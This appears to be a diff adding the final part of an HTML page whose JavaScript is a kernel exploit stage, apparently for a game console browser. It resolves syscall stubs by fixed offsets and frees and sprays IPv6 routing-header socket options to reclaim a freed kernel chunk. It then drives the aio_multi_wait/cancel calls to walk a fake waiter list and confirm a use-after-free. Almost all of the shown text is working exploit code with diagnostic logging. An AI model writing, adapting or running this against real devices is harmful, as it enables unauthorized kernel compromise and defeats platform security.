+        r3Log("AIO-SATURATE-RET", "ret=" + R12_RET(rsat)
+            + "-id=0x" + bidVal.toString(16)
+            + "-(immortal-group-the-daemon-stays-busy)");
+
+        // 5. the main group (jb.js:933-959): 2 write commands
+        var rbAb = new ArrayBuffer(0x40);
+        var rqAb = new ArrayBuffer(2 * R12_DESC_SZ);
+        var rqDv = new DataView(rqAb);
+        R12_KEEP.push(rbAb, rqAb, rqDv);
+        var rqAddr = r4BufAddr(rqAb), rbAddr = r4BufAddr(rbAb);
+        for (var k = 0; k < 2; ++k) {
+            var b = k * R12_DESC_SZ;
+            r4Put64(rqDv, b + 0x08, 0x40);
+            r4Put64(rqDv, b + 0x10, rbAddr);
+            rqDv.setInt32(b + 0x20, sp0, true);
+        }
+        var idAb = new ArrayBuffer(8), idDv = new DataView(idAb);
+        var stAb = new ArrayBuffer(8), stDv = new DataView(stAb);
+        var toAb = new ArrayBuffer(8), toDv = new DataView(toAb);
+        R12_KEEP.push(idAb, idDv, stAb, stDv, toAb, toDv);
+        var idAddr = r4BufAddr(idAb), stAddr = r4BufAddr(stAb);
+        var toAddr = r4BufAddr(toAb);
+        toDv.setUint32(0, R12_TOWAIT, true);   // jb.js:955-959 (1 ms scene)
+        toDv.setUint32(4, 0, true);
+
+        // 6. the fake mutex (jb.js:741-751) - owner LEFT AT 0: the fast
+        // CAS path, never sleeps (owner=4 = a leak window needing 2 threads)
+        var mAb = new ArrayBuffer(0x40);
+        var mDv = new DataView(mAb);
+        R12_KEEP.push(mAb, mDv);
+        var mAddr = r4BufAddr(mAb);
+
+        // 7. the sinks (jb.js:1203-1214): 0x40000000 - every decrement
+        // read = one walked node
+        var dumAb = new ArrayBuffer(0x40), dumDv = new DataView(dumAb);
+        var snkAb = new ArrayBuffer(0x40), snkDv = new DataView(snkAb);
+        R12_KEEP.push(dumAb, dumDv, snkAb, snkDv);
+        var dumAddr = r4BufAddr(dumAb), snkAddr = r4BufAddr(snkAb);
+        dumDv.setUint32(0, 0x40000000, true);
+        snkDv.setUint32(0x20, 0x40000000, true);   // N0SINK (node0+0x08)
+        var n0sinkAddr = snkAddr + 0x20;
+
+        // 8. the arena (jb.js:1216-1240): 4 chained USER nodes, dec/sink
+        // in USER space ONLY (no kernel target)
+        var N_AR = 4;
+        var arAb = new ArrayBuffer(R12_NODE_SZ * N_AR);
+        var arDv = new DataView(arAb);
+        R12_KEEP.push(arAb, arDv);
+        var arAddr = r4BufAddr(arAb);
+        function r12Wnode(i, decAddr, sinkAddr, last) {
+            var o = i * R12_NODE_SZ;
+            r4Put64(arDv, o + 0x00, decAddr);
+            r4Put64(arDv, o + 0x08, sinkAddr);
+            r4Put64(arDv, o + 0x10, mAddr);
+            r4Put64(arDv, o + 0x30, last ? 0 : arAddr + o + R12_NODE_SZ);
+        }
+        for (var i = 0; i < N_AR; ++i)
+            r12Wnode(i, dumAddr, dumAddr, i === N_AR - 1);
+
+        // 9. node0 (jb.js:979-986): the SPRAYED content. +0x00 is NOT
+        // written: len=8 (@+1) and the current segleft (@+3) encode the
+        // decrement address chosen by the scratch gate (0x04000800 by
+        // default)
+        var pAb = new ArrayBuffer(R12_RTH_SIZE);
+        var pDv = new DataView(pAb);
+        R12_KEEP.push(pAb, pDv);
+        var pAddr = r4BufAddr(pAb);
+        function r12SetNode0(nextAddr, secondDec) {
+            new Uint8Array(pAb).fill(0);
+            pDv.setUint8(1, R12_RTH_LEN);
+            pDv.setUint8(3, R12_SEGLEFT_CUR);
+            r4Put64(pDv, 0x08, secondDec);
+            r4Put64(pDv, 0x10, mAddr);
+            r4Put64(pDv, 0x30, nextAddr);
+        }
+        r12SetNode0(arAddr, n0sinkAddr);
+
+        // self-test (the magic values reread - the standing discipline)
+        // + proof dumps
+        var magicOk = ext_read32(dumAddr) === 0x40000000
+            && ext_read32(n0sinkAddr) === 0x40000000
+            && (ext_read32(pAddr + 0x30) >>> 0)
+                === ((arAddr % 0x100000000) >>> 0);
+        r3Log("AIO-BUF-SELFTEST", (magicOk ? "PASS" : "FAIL")
+            + "-dum=" + hex(dumAddr) + "-snk=" + hex(snkAddr)
+            + "-m=" + hex(mAddr) + "-arena=" + hex(arAddr)
+            + "-node0=" + hex(pAddr)
+            + "-scratch0=0x" + st.scratch0.toString(16)
+            + "-(walk-anchors-reread-by-the-carrier)");
+        if (!magicOk) return "buffers-failed";
+        r4DumpRange("aio-node0", pAddr, R12_RTH_SIZE);
+        r4DumpRange("aio-arena", arAddr, R12_NODE_SZ * N_AR);
+        r3Flush();
+
+        // 10. whoHasF (jb.js:1250-1273): rereads the sprayed options -
+        // a nonzero +0x20 = the status-write TOUCHED a kernel chunk
+        var gfAb = new ArrayBuffer(R12_RTH_SIZE);
+        var glAb = new ArrayBuffer(8);
+        var gfDv = new DataView(gfAb), glDv = new DataView(glAb);
+        R12_KEEP.push(gfAb, glAb, gfDv, glDv);
+        var gfAddr = r4BufAddr(gfAb), glAddr = r4BufAddr(glAb);
+        function whoHasF() {
+            var found = -1, hits = 0, state0 = 0;
+            var lim = Math.min(POOL.length, R12_WHOLEN);
+            for (var i = 0; i < lim; ++i) {
+                glDv.setUint32(0, R12_RTH_SIZE, true);
+                glDv.setUint32(4, 0, true);
+                new Uint8Array(gfAb).fill(0);
+                var rg = sc(R12_NUM_GETSOCKOPT, [POOL[i], R12_IPPROTO_IPV6,
+                    R12_IPV6_RTHDR, gfAddr, glAddr]);
+                syscalls++;
+                if (!R12_RV0(rg)) continue;
+                var s32 = gfDv.getUint32(0x20, true) >>> 0;
+                if (s32 !== 0) {
+                    hits++;
+                    if (found < 0) { found = i; state0 = s32; }
+                }
+            }
+            return { idx: found, hits: hits, state: state0 };
+        }
+
+        // ---- LA SEQUENCE P1->P5 (boucle DANS la meme serie si ?arms>1) --
+        var anyProof = false, anySubmitOk = false, anyWho = false;
+        var verdictFail = null;
+        for (var round = 1; round <= R12_ARMS && !verdictFail; ++round) {
+            var preDum = dumDv.getUint32(0, true) >>> 0;
+            var preN0 = snkDv.getUint32(0x20, true) >>> 0;
+            var preScr = ext_read32(R12_NODE0_DEC) >>> 0;
+
+            // P1 - FREE the pool's rthdr options (jb.js:1004-1006)
+            r3Flush();
+            r3Log("AIO-P1-START", "r=" + round
+                + "-freeing-rthdr-x-" + POOL.length
+                + "-chunks-0x48-returned-to-zone-0x60-(jb.js:1005-1006)");
+            st.phase = "p1";
+            var tp1 = Date.now();
+            // SCENE FIDELITY: the jb.js:1005-1006 loop is PURE (zero
+            // logging between syscalls); per-iteration flushes would
+            // stretch the reclaim window ~7x. Flush at entry + every 64.
+            for (var i = 0; i < POOL.length; ++i) {
+                if ((i & 63) === 0) r3Flush();
+                sc(R12_NUM_SETSOCKOPT, [POOL[i], R12_IPPROTO_IPV6,
+                    R12_IPV6_RTHDR, 0, 0]);
+                syscalls++;
+            }
+            r3Flush();
+            var msP1 = Date.now() - tp1;
+            r3Log("AIO-P1-DONE", "r=" + round
+                + "-freed=" + POOL.length + "-ms=" + msP1);
+
+            // P2 - SUBMIT 2 commands (jb.js:1007-1019)
+            r3Flush();
+            r3Log("AIO-P2-SUBMIT-PRE", "r=" + round
+                + "-cmd=1|0x1000-n=2-flags=3-(jb.js:1008-1015)");
+            st.phase = "p2";
+            var rsu = sc(R12_NUM_AIO_SUBMIT, [0x1001, rqAddr, 2, 3,
+                idAddr]);
+            syscalls++;
+            var idVal = idDv.getUint32(0, true) >>> 0;
+            var suOk = R12_RV0(rsu);
+            r3Log("AIO-P2-SUBMIT-RET", "r=" + round
+                + "-ret=" + R12_RET(rsu) + "-id=0x" + idVal.toString(16)
+                + (suOk ? "-GROUP-CREATED" : "-REFUSED"));
+            if (suOk) { anySubmitOk = true; st.submitOk++; }
+            else { verdictFail = "submit-refused"; break; }
+
+            // P3 - WAIT (jb.js:1021-1034): the jobs DIE during the
+            // sleep; their completion frees the group's chunks.
+            // ERROR CALIBRATION (measured 2026-10-16): the wait returns
+            // -1 in 6 ms WITHOUT sleeping (towait=100000). Probable
+            // orbis convention rax=-errno: -1 = EPERM = GATE. Two
+            // side-effect-free probes to settle it:
+            //  (a) count=0x90 (>0x80): EINVAL(22) expected -> 0xffffffea
+            //      if -errno; if this probe also returns -1, the failure
+            //      happens BEFORE count validation (context/cred door);
+            //  (b) bogus id 0xffffffff: lookup failure -> the id
+            //      resolution code (compare with the real wait).
+            var cal1 = sc(R12_NUM_AIO_WAIT, [idAddr, 0x90, stAddr, 0, toAddr]);
+            syscalls++;
+            var bogAb = new ArrayBuffer(8), bogDv = new DataView(bogAb);
+            R12_KEEP.push(bogAb, bogDv);
+            bogDv.setUint32(0, 0xdeadbeef, true);   // well-formed id, never allocated
+            var bogAddr = r4BufAddr(bogAb);
+            var cal2 = sc(R12_NUM_AIO_WAIT, [bogAddr, 2, stAddr, 0, toAddr]);
+            syscalls++;
+            r3Log("AIO-WAIT-CALIB",
+                "count-invalide-ret=" + R12_RET(cal1)
+                + "-expected-0xffffffea-if--errno-(EINVAL-22)"
+                + "-bogus-id-ret=" + R12_RET(cal2)
+                + "-if-same-ret-as-the-real-wait-=-fail-before-count");
+            // __aio_init probe 670 (the last aio invalidation test): if
+            // the wait's gate is an aio context never initialized in the
+            // browser process, calling it THEN retrying the wait might
+            // open it. Stub at +0x5ab0 (verified from the dump,
+            // 2026-10-16), resolved upstream. Unknown args -> (0,0):
+            // at worst EFAULT/EINVAL, no side effects.
+            if (stubs[670]) {
+                var rinit = sc(670, [0, 0]);
+                syscalls++;
+                r3Log("AIO-AIO-INIT-670", "ret=" + R12_RET(rinit)
+                    + "-if-0-then-wait-still--1-=-formal-gate");
+            }
+            r3Flush();
+            r3Log("AIO-P3-WAIT-PRE", "r=" + round
+                + "-n=2-mode=0-towait=" + R12_TOWAIT
+                + "us-(jb.js:1033-the-jobs-die-in-the-sleep)");
+            st.phase = "p3";
+            var tw0 = Date.now();
+            var rwa = sc(R12_NUM_AIO_WAIT, [idAddr, 2, stAddr, 0, toAddr]);
+            syscalls++;
+            var waitMs = Date.now() - tw0;
+            r3Log("AIO-P3-WAIT-RET", "r=" + round
+                + "-ret=" + R12_RET(rwa) + "-ms=" + waitMs
+                + "-st0=0x" + stDv.getUint32(0, true).toString(16)
+                + "-st1=0x" + stDv.getUint32(4, true).toString(16));
+
+            // P4 - SPRAY node0 (jb.js:1036-1044): the fake waiter
+            // reclaims the freed chunk
+            r3Flush();
+            r3Log("AIO-P4-SPRAY-START", "r=" + round
+                + "-spray-node0-x-" + POOL.length
+                + "-size-0x48-(jb.js:1037-1042)");
+            st.phase = "p4";
+            var tp4 = Date.now();
+            var n4 = 0;
+            // SCENE FIDELITY: same as P1 - pure loop jb.js:1037-1042
+            for (var i = 0; i < POOL.length; ++i) {
+                if ((i & 63) === 0) r3Flush();
+                var rr = sc(R12_NUM_SETSOCKOPT, [POOL[i], R12_IPPROTO_IPV6,
+                    R12_IPV6_RTHDR, pAddr, R12_RTH_SIZE]);
+                syscalls++;
+                if (R12_RV0(rr)) n4++;
+            }
+            r3Flush();
+            var msP4 = Date.now() - tp4;
+            r3Log("AIO-P4-SPRAY-DONE", "r=" + round
+                + "-sprayed=" + n4 + "/" + POOL.length + "-ms=" + msP4);
+
+            // re-arm the chained arena (fresh round)
+            for (var i = 0; i < N_AR; ++i)
+                r12Wnode(i, dumAddr, dumAddr, i === N_AR - 1);
+            dumDv.setUint32(0, 0x40000000, true);
+
+            // P5 - THE CANCEL = THE WALK (jb.js:1317-1318): cancels
+            // index 0, walking the waiter list led by the fake node0
+            r3Flush();
+            r3Log("AIO-P5-CANCEL-PRE", "r=" + round
+                + "-n=1-(the-walk-cancels-index-0-jb.js:1318)");
+            st.phase = "p5";
+            var rc = sc(R12_NUM_AIO_CANCEL, [idAddr, 1, stAddr]);
+            syscalls++;
+            r3Log("AIO-P5-CANCEL-RET", "r=" + round
+                + "-ret=" + R12_RET(rc)
+                + "-st0=0x" + stDv.getUint32(0, true).toString(16));
+
+            // ---- PREUVES (jb.js:1320-1348), lues APRES le retour -------
+            var postDum = dumDv.getUint32(0, true) >>> 0;
+            var postN0 = snkDv.getUint32(0x20, true) >>> 0;
+            var postScr = ext_read32(R12_NODE0_DEC) >>> 0;
+            var dumMoved = (0x40000000 - postDum) >>> 0;
+            var n0Moved = (0x40000000 - postN0) >>> 0;
+            var ownerNow = mDv.getUint32(0x18, true) >>> 0;
+            var ownerHi = mDv.getUint32(0x1c, true) >>> 0;
+            // dumMoved > 0 => a USER arena node was walked => the sprayed
+            // kernel chunk (node0) was the list head => RECLAIM LANDED =
+            // the UAF is ALIVE
+            var roundProof = dumMoved > 0 || n0Moved > 0
+                || (postScr >>> 0) !== (preScr >>> 0);
+            if (roundProof) {
+                anyProof = true;
+                st.walkProofs++;
+            }
+            var who = { idx: -1, hits: 0, state: 0 };
+            if (R12_WHOLEN > 0) {
+                r3Flush();
+                who = whoHasF();
+                if (who.hits > 0) { anyWho = true; st.whoHits += who.hits; }
+            }
+            r3Log("AIO-P5-PROOF", "r=" + round
+                + "-dum_moved=" + dumMoved + "/" + N_AR
+                + "-n0_moved=" + n0Moved
+                + "-scratch=0x" + postScr.toString(16)
+                + "(base-0x" + st.scratch0.toString(16) + ")"
+                + "-owner=" + (ownerHi >>> 0).toString(16) + ":"
+                + (ownerNow >>> 0).toString(16)
+                + "-f_socket=" + who.idx + "-f_hits=" + who.hits
+                + "-state=0x" + (who.state >>> 0).toString(16)
+                + "-sprayed=" + n4 + "-p1ms=" + msP1 + "-p4ms=" + msP4
+                + (roundProof ? "-WALK-ATTESTED" : "-benign-miss"));
+            st.rounds++;
+
+            // REAP (jb.js:1275-1294): free the group - arena TERMINATED
+            // (next=0) before the reap
+            r12Wnode(0, dumAddr, dumAddr, true);
+            r3Flush();
+            st.phase = "reap";
+            var rc2 = sc(R12_NUM_AIO_CANCEL, [idAddr, 2, stAddr]);
+            var rp2 = sc(R12_NUM_AIO_POLL, [idAddr, 2, stAddr]);
+            var rd2 = sc(R12_NUM_AIO_DELETE, [idAddr, 2, stAddr]);
+            syscalls += 3;
+            r3Log("AIO-REAP", "r=" + round
+                + "-cancel=" + R12_RET(rc2)
+                + "-poll=" + R12_RET(rp2)
+                + "-delete=" + R12_RET(rd2)
+                + "-(group-freed-jb.js:1279-1281)");
+            if (!R12_RV0(rd2))
+                r3Log("AIO-REAP-NOTE", "delete!=" + R12_RET(rd2)
+                    + "-group-may-already-be-dead-(info)");
+        }
+
+        // cleanup: close the pool - close is jb.js's SYS.close=6 (the
+        // 114 noted at +0x5890 is NOT the scene's close: never called)
+        if (Q.get("noclose") !== "1") {
+            for (var i = 0; i < POOL.length; ++i) {
+                if ((i & 63) === 0) r3Flush();
+                sc(R12_NUM_CLOSE, [POOL[i]]);
+                syscalls++;
+            }
+            r3Flush();
+            r3Log("AIO-POOL-CLOSED", "closed=" + POOL.length);
+        }
+        st.anySubmitOk = anySubmitOk;
+        st.anyProof = anyProof;
+        st.anyWho = anyWho;
+        st.seriesRet = verdictFail || "series-complete";
+        return st.seriesRet;
+        } finally {
+            // PIN-RESTORE (jb.js:896-907) - ALWAYS, even on an early
+            // return (scratch-refused etc.). It MUST live here: after
+            // r12Series's finally the mf is disarmed and sc() is dead.
+            try {
+                new Uint8Array(pinAb).fill(0);
+                pinDv.setUint32(0, savedMask, true);
+                var rvR = sc(R12_NUM_CPUSET_SET, [3, 1, -1, 0x10, pinAd]);
+                syscalls++;
+                r3Log("AIO-PIN-RESTORED", "rv=" + R12_RET(rvR)
+                    + "-mask=0x" + savedMask.toString(16)
+                    + "-(jb.js:896-907)");
+                r3Flush();
+            } catch (pinErr) {
+                r3Log("AIO-PIN-RESTORE-FAIL",
+                    String(pinErr).slice(0, 80));
+            }
+        }
+    });
+    // series over: mf/pivot restored by r12Series's finally
+    return { st: st, syscalls: syscalls };
+}
+
+// sequence verdict (called after the series, outside the arming)
+function r12RunVerdict(sr) {
+    var st = sr.st;
+    var verdict;
+    if (st.anyProof || st.anyWho)
+        verdict = "AIO-WALK-PROVEN";
+    else if (st.submitOk > 0)
+        verdict = "AIO-AIO-LIVE-NO-RECLAIM";
+    else if (st.phase === "mmap")
+        verdict = "AIO-SCRATCH-REFUSE";
+    else if (st.phase === "init")
+        verdict = "AIO-SETUP-FAIL";
+    else
+        verdict = "AIO-AIO-ABSENT";
+    r3Log(verdict,
+        "series=" + (st.seriesRet || "?")
+        + "-phaseEnd=" + st.phase
+        + "-rounds=" + st.rounds
+        + "-submitOk=" + st.submitOk
+        + "-walkProofs=" + st.walkProofs
+        + "-whoHits=" + st.whoHits
+        + "-scratch0=0x" + (st.scratch0 === null ? 0
+            : (st.scratch0 >>> 0).toString(16))
+        + "-syscalls=" + sr.syscalls
+        + "-(nonzero-dum/n0/scratch/whoHasF=THE-WALK-TOUCHED-OUR-NODES"
+        + "=-the-scene-aio-UAF-ALIVE-on-14.00)");
+    return verdict;
+}
+
+// SEQUENCE RUN 12 : resolution stubs -> UNE serie AIO -> verdict
+function r12AioLayer(errorFn, G, c, mainMf, mainOrig, pivotObj, pivotCell) {
+    r3Flush();               // flush the fcall verdict to the log first
+    var syscalls = 0;
+    r3Log("AIO-BOOT", "rev=" + R12_REVISION
+        + "-source=jb.js:995-1046-armOnce-exact-relapse_1352"
+        + "-stubs=exact-offsets-verified-2026-10-16"
+        + "-off669=+0x" + R12_OFF_AIO_SUBMIT.toString(16)
+        + "-off663=+0x" + R12_OFF_AIO_WAIT.toString(16)
+        + "-off666=+0x" + R12_OFF_AIO_CANCEL.toString(16)
+        + "-off105=+0x" + R12_OFF_SETSOCKOPT.toString(16)
+        + "-off97=+0x" + R12_OFF_SOCKET.toString(16)
+        + "-off135=+0x" + R12_OFF_SOCKETPAIR.toString(16)
+        + "-off477=+0x" + R12_OFF_MMAP.toString(16)
+        + "-off118=+0x" + R12_OFF_GETSOCKOPT.toString(16)
+        + "-off6=+0x" + R12_OFF_CLOSE.toString(16)
+        + "-syscalls-allowed=6+97+105+118+135+477+662+663+664+666+669"
+        + "-forbidden=622-open-device-connect-zero-calls"
+        + "-bug=KEX-aio_multi_wait-(663)-UAF-walk-waiter"
+        + "-proofs=dum/n0sink/scratch/whoHasF-no-concurrency"
+        + "-one-series-one-arm-disarm-cycle-per-session"
+        + "-arms=" + R12_ARMS + "-spray=" + R12_SPRAY
+        + "-towait=" + R12_TOWAIT + "-wholen=" + R12_WHOLEN);
+    r3Flush();
+    var vProbe = "AIO-SKIPPED";
+    try {
+        // 1. Resolve every stub BEFORE any syscall; one miss =
+        //    clean stop (zero unverified addresses)
+        var stubs = {};
+        stubs[R12_NUM_CLOSE] = r12ResolveStub(errorFn,
+            R12_NUM_CLOSE, R12_OFF_CLOSE, "close");
+        stubs[R12_NUM_SOCKET] = r12ResolveStub(errorFn,
+            R12_NUM_SOCKET, R12_OFF_SOCKET, "socket");
+        stubs[R12_NUM_SETSOCKOPT] = r12ResolveStub(errorFn,
+            R12_NUM_SETSOCKOPT, R12_OFF_SETSOCKOPT, "setsockopt");
+        stubs[R12_NUM_GETSOCKOPT] = r12ResolveStub(errorFn,
+            R12_NUM_GETSOCKOPT, R12_OFF_GETSOCKOPT, "getsockopt");
+        stubs[R12_NUM_SOCKETPAIR] = r12ResolveStub(errorFn,
+            R12_NUM_SOCKETPAIR, R12_OFF_SOCKETPAIR, "socketpair");
+        stubs[R12_NUM_MMAP] = r12ResolveStub(errorFn,
+            R12_NUM_MMAP, R12_OFF_MMAP, "mmap");
+        stubs[R12_NUM_AIO_SUBMIT] = r12ResolveStub(errorFn,
+            R12_NUM_AIO_SUBMIT, R12_OFF_AIO_SUBMIT, "aio_submit_cmd");
+        stubs[R12_NUM_AIO_WAIT] = r12ResolveStub(errorFn,
+            R12_NUM_AIO_WAIT, R12_OFF_AIO_WAIT, "aio_multi_wait");
+        stubs[R12_NUM_AIO_CANCEL] = r12ResolveStub(errorFn,
+            R12_NUM_AIO_CANCEL, R12_OFF_AIO_CANCEL, "aio_multi_cancel");
+        stubs[R12_NUM_AIO_POLL] = r12ResolveStub(errorFn,
+            R12_NUM_AIO_POLL, R12_OFF_AIO_POLL, "aio_multi_poll");
+        stubs[670] = r12ResolveStub(errorFn, 670, 0x5ab0, "__aio_init");
+        stubs[R12_NUM_AIO_DELETE] = r12ResolveStub(errorFn,
+            R12_NUM_AIO_DELETE, R12_OFF_AIO_DELETE, "aio_multi_delete");
+        stubs[R12_NUM_CPUSET_GET] = r12ResolveStub(errorFn,
+            R12_NUM_CPUSET_GET, R12_OFF_CPUSET_GET, "cpuset_getaffinity");
+        stubs[R12_NUM_CPUSET_SET] = r12ResolveStub(errorFn,
+            R12_NUM_CPUSET_SET, R12_OFF_CPUSET_SET, "cpuset_setaffinity");
+        var stubFail = [];
+        if (!stubs[R12_NUM_AIO_SUBMIT]) stubFail.push("669");
+        if (!stubs[R12_NUM_AIO_WAIT]) stubFail.push("663");
+        if (!stubs[R12_NUM_AIO_CANCEL]) stubFail.push("666");
+        if (!stubs[R12_NUM_AIO_POLL]) stubFail.push("664");
+        if (!stubs[R12_NUM_AIO_DELETE]) stubFail.push("662");
+        if (!stubs[R12_NUM_SETSOCKOPT]) stubFail.push("105");
+        if (!stubs[R12_NUM_GETSOCKOPT]) stubFail.push("118");
+        if (!stubs[R12_NUM_SOCKETPAIR]) stubFail.push("135");
+        if (!stubs[R12_NUM_SOCKET]) stubFail.push("97");
+        if (!stubs[R12_NUM_MMAP]) stubFail.push("477");
+        if (!stubs[R12_NUM_CPUSET_GET]) stubFail.push("487");
+        if (!stubs[R12_NUM_CPUSET_SET]) stubFail.push("488");
+        if (!stubs[R12_NUM_CLOSE]) stubFail.push("6");
+        if (stubFail.length) {
+            r3Log("AIO-DONE", "verdict=AIO-STUB-FAIL-syscalls=0"
+                + "-missing=" + stubFail.join(",")
+                + "-zero-syscalls-no-unverified-address-ever");
+            r3Flush();
+            return;
+        }
+        r4DumpRange("stub-aio-submit", stubs[R12_NUM_AIO_SUBMIT],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-aio-wait", stubs[R12_NUM_AIO_WAIT],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-aio-cancel", stubs[R12_NUM_AIO_CANCEL],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-aio-poll", stubs[R12_NUM_AIO_POLL],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-aio-delete", stubs[R12_NUM_AIO_DELETE],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-setsockopt", stubs[R12_NUM_SETSOCKOPT],
+            R12_STUB_DUMP);
+        r4DumpRange("stub-socket", stubs[R12_NUM_SOCKET],
+            R12_STUB_DUMP);
+        r3Flush();
+
+        // 2. THE AIO SEQUENCE P1->P5 (buffers self-tested before any
+        //    syscall; scratch page hard-gated before any cancel)
+        var r12 = r12ProbeAio(G, c, mainMf, mainOrig, pivotObj,
+            pivotCell, stubs);
+        syscalls += r12.syscalls;
+        vProbe = r12RunVerdict(r12);
+        r3Log("AIO-EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1)
+            + "-(jb.js:3346-final-check)");
+        r3Log("AIO-DONE", "verdict=" + vProbe
+            + "-syscalls=" + syscalls
+            + "-(getpid-not-recalled-one-cycle-per-session-law)");
+    } catch (error) {
+        r3Log("AIO-THREW", (error && error.name) + ":"
+            + String(error && error.message).slice(0, 100));
+        try {
+            r3Log("AIO-EXPM1-POST-THREW", "expm1(1)=" + Math.expm1(1)
+                + "-(series-finally-restored-before-propagation)");
+        } catch (_) {}
+        r3Log("AIO-DONE", "verdict=AIO-THREW"
+            + "-syscalls=" + syscalls);
+    }
+    r3Flush();
+}
+</script>
+</body>
+</html>
